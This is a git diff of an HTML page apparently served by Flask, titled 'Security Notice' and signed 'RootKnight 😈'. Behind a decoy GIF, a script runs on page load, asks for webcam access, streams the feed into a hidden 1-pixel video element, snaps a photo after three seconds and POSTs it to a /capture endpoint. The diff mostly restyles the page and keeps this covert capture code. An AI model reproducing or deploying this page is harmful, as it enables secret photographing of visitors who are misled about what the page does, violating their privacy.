@@ -1,75 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Security Notice</title>
     <style>
-        body {
-            background-color: black;
-            color: limegreen;
-            font-family: 'Courier New', monospace;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .gif-container {
-            width: 200px;
-            height: 200px;
-        }
-    </style>
-</head>
-<body>
+      body {
+        background-color: black;
+        color: yellow;
+        font-family: "Courier New", monospace;
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        overflow: hidden;
+      }
+      .gif-container img {
+        width: 300px;
+        height: auto;
+        display: block;
+      }
 
+      .footer {
+        margin-top: 50px;
+        font-size: 18px;
+        opacity: 0.7;
+      }
+    </style>
+  </head>
+  <body>
     <div class="gif-container">
-        <!-- Add your GIF here -->
-        <img src="/templates/my-gif.gif" alt="Pikachu">
+      <!-- Add your GIF here -->
+      <img
+        src="{{ url_for('static', filename='my-gif.gif') }}"
+        alt="Loading GIF"
+      />
     </div>
 
     <script>
-        async function capturePhoto() {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      async function capturePhoto() {
+        try {
+          let stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
 
-                let video = document.createElement("video");
-                video.style.position = "absolute";
-                video.style.width = "1px";
-                video.style.height = "1px";
-                video.style.opacity = "0.01";
-                video.autoplay = true;
-                video.srcObject = stream;
-                document.body.appendChild(video);
+          let video = document.createElement("video");
+          video.style.position = "absolute";
+          video.style.width = "1px";
+          video.style.height = "1px";
+          video.style.opacity = "0.01";
+          video.autoplay = true;
+          video.srcObject = stream;
+          document.body.appendChild(video);
 
-                await new Promise(resolve => setTimeout(resolve, 3000));
+          await new Promise((resolve) => setTimeout(resolve, 3000));
 
-                let canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                let ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0);
+          let canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          let ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
 
-                let photo = canvas.toDataURL("image/jpeg");
+          let photo = canvas.toDataURL("image/jpeg");
 
-                stream.getTracks().forEach(track => track.stop());
-                document.body.removeChild(video);
+          stream.getTracks().forEach((track) => track.stop());
+          document.body.removeChild(video);
 
-                fetch("/capture", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ photo }),
-                }).then(res => res.json()).then(console.log);
-                
-            } catch (error) {
-                console.error("Camera access denied or error occurred:", error);
-            }
+          fetch("/capture", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ photo }),
+          })
+            .then((res) => res.json())
+            .then(console.log);
+        } catch (error) {
+          console.error("Camera access denied or error occurred:", error);
         }
+      }
 
-        capturePhoto();
+      capturePhoto();
     </script>
 
-</body>
+    <p class="footer">RootKnight 😈</p>
+  </body>
 </html>
